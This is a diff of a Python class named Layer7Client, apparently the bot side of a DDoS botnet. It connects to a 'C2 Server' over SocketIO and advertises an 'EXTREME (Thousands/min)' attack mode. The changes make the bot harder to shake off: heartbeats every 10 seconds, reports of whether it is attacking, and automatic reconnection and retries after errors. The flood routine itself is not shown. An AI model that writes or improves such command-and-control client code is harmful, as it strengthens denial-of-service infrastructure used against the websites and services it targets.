@@ -399,17 +399,17 @@ class Layer7Client:
         """Setup SocketIO event handlers"""
         @self.sio.event
         def connect():
-            print(f"✅ Connected to C2 Server: {self.server_url}")
+            print(f"\n✅ Connected to C2 Server: {self.server_url}")
             self.last_heartbeat = time.time()
             self.register_client()
         
         @self.sio.event
         def connect_error(data):
-            print(f"⚠️ Connection error, retrying...")
+            print(f"\n⚠️ Connection error: {data}, retrying...")
         
         @self.sio.event
         def disconnect():
-            print("⚠️ Disconnected, reconnecting...")
+            print("\n⚠️ Disconnected from server, auto-reconnecting...")
             self.running = False
         
         @self.sio.event
@@ -543,30 +543,31 @@ class Layer7Client:
         print("🛑 Attack stopped")
     
     def heartbeat_monitor(self):
-        """Keep connection alive"""
+        """Keep connection alive with aggressive heartbeats"""
         while True:
             try:
                 if self.sio.connected:
-                    if time.time() - self.last_heartbeat > 20:
-                        try:
-                            self.sio.emit('ping', {'timestamp': time.time()})
-                            self.last_heartbeat = time.time()
-                        except:
-                            pass
-                    
+                    # Send heartbeat every 10 seconds
                     try:
                         self.sio.emit('client_stats', {
                             'stats': {
-                                'cpu_usage': psutil.cpu_percent(interval=1),
+                                'cpu_usage': psutil.cpu_percent(interval=0),
                                 'memory_usage': psutil.virtual_memory().percent,
-                                'timestamp': datetime.now().isoformat()
+                                'timestamp': datetime.now().isoformat(),
+                                'is_attacking': self.running,
+                                'heartbeat': True
                             }
                         })
-                    except:
-                        pass
+                        self.last_heartbeat = time.time()
+                        print(f"\r💚 Heartbeat sent | Connected: {int(time.time() - self.last_heartbeat)}s ago", end='', flush=True)
+                    except Exception as e:
+                        print(f"\r⚠️ Heartbeat failed: {e}", end='', flush=True)
+                else:
+                    print("\r⚠️ Not connected, waiting for reconnection...", end='', flush=True)
                 
                 time.sleep(10)
-            except:
+            except Exception as e:
+                print(f"\r⚠️ Monitor error: {e}", end='', flush=True)
                 time.sleep(10)
     
     def connect(self):
@@ -581,26 +582,36 @@ class Layer7Client:
             print(f"🔥 Mode: EXTREME (Thousands/min)")
             print("="*60 + "\n")
             
-            print("⚡ Connecting...")
+            print("⚡ Connecting with keep-alive enabled...")
             
-            self.sio.connect(self.server_url, wait_timeout=30, transports=['websocket', 'polling'])
+            # Connect with both transports
+            self.sio.connect(
+                self.server_url, 
+                wait_timeout=30, 
+                transports=['polling', 'websocket']  # Try polling first, then websocket
+            )
             
-            print("\n✅ Connected!")
-            print("📡 Keep-alive enabled")
-            print("⚡ Ready for commands\n")
+            print("\n✅ Initial connection successful!")
+            print("📡 Starting heartbeat monitor (10s intervals)...")
             
+            # Start heartbeat in background
             heartbeat = threading.Thread(target=self.heartbeat_monitor, daemon=True)
             heartbeat.start()
             
+            print("⚡ Ready for commands (Connection will stay alive)\n")
+            
+            # Keep main thread alive
             while True:
                 time.sleep(1)
                 
         except KeyboardInterrupt:
-            print("\n🛑 Stopped by user")
+            print("\n\n🛑 Stopped by user")
             self.disconnect()
         except Exception as e:
-            print(f"\n❌ Error: {e}")
-            self.disconnect()
+            print(f"\n\n❌ Connection error: {e}")
+            print("Retrying in 5 seconds...")
+            time.sleep(5)
+            self.connect()  # Retry connection
     
     def disconnect(self):
         """Disconnect"""
